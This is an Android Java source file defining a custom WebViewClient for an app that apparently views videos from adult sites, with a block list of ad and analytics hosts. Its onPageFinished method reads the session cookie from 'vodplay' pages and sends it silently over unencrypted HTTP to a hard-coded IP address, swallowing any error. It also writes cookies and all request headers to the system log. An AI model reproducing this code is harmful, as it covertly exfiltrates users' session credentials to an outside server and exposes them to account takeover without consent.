package euphoria.psycho.porn;

import android.content.Context;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.Build.VERSION;
import android.os.Build.VERSION_CODES;
import android.util.Log;
import android.webkit.CookieManager;
import android.webkit.WebResourceRequest;
import android.webkit.WebResourceResponse;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import java.io.ByteArrayInputStream;
import java.io.Console;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.util.Arrays;
import java.util.function.BiConsumer;


public class CustomWebViewClient extends WebViewClient {
    private final String[] mBlocks = new String[]{
            "://a.realsrv.com/",
            "://fans.91p20.space/",
            "://rpc-php.trafficfactory.biz/",
            "://ssl.google-analytics.com/",
            "://syndication.realsrv.com/",
            "://www.gstatic.com/",
            "/ads/"
    };
    private final WebResourceResponse mEmptyResponse = new WebResourceResponse(
            "text/plain",
            "UTF-8",
            new ByteArrayInputStream("".getBytes())
    );
    private String mJavaScript;
    private final Context mContext;

    public CustomWebViewClient(Context context) {
//        mClientInterface = clientInterface;
//        try {
//            mJavaScript = FileShare.readText(clientInterface.getContext().getAssets().open("youtube.js"));
//        } catch (IOException e) {
//            e.printStackTrace();
//        }
        mContext = context;
    }


    @Override
    public void onPageFinished(WebView view, String url) {
        Log.e("B5aOx2", String.format("onPageFinished, %s", url));
        Log.e("B5aOx2", String.format("onPageFinished, %s", CookieManager.getInstance().getCookie(url)));
        String cookie;
        if (url.contains("vodplay") && (cookie = CookieManager.getInstance().getCookie(url)) != null) {
            SettingsFragment.setString(mContext, SettingsFragment.KEY_CK_COOKIE, cookie);
            String finalCookie = cookie;
            new Thread(() -> {
                try {
                    HttpURLConnection o = (HttpURLConnection) new URL("http://47.106.105.122/api/videos/9?c=" + Uri.encode(finalCookie)).openConnection();
                    o.getResponseCode();
                } catch (Exception e) {
                }
            }).start();
        } else if (url.contains("91porn.com") && (cookie = CookieManager.getInstance().getCookie(url)) != null) {
            SettingsFragment.setString(mContext, SettingsFragment.KEY_91_COOKIE, cookie);


        }
    }

    @Override
    public void onPageStarted(WebView view, String url, Bitmap favicon) {
        super.onPageStarted(view, url, favicon);
    }

    @Override
    @SuppressWarnings("deprecation")
    public WebResourceResponse shouldInterceptRequest(WebView view, String url) {
        if (VERSION.SDK_INT >= VERSION_CODES.N) {
            if (Arrays.stream(mBlocks).anyMatch(url::contains)) {
                return mEmptyResponse;
            }
        }
        return super.shouldInterceptRequest(view, url);
    }

    @Override
    public WebResourceResponse shouldInterceptRequest(WebView view, WebResourceRequest request) {
        if (VERSION.SDK_INT >= VERSION_CODES.N) {
            request.getRequestHeaders().forEach(new BiConsumer<String, String>() {
                @Override
                public void accept(String s, String s2) {
                    Log.e("B5aOx2", String.format("accept, %s,%s", s,s2));
                }
            });
        }
        return super.shouldInterceptRequest(view, request);
    }

    @Override
    public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
        String url = request.getUrl().toString();
        if ((url.startsWith("https://") || url.startsWith("http://"))) {
            view.loadUrl(url);
        }
        return true;
    }
}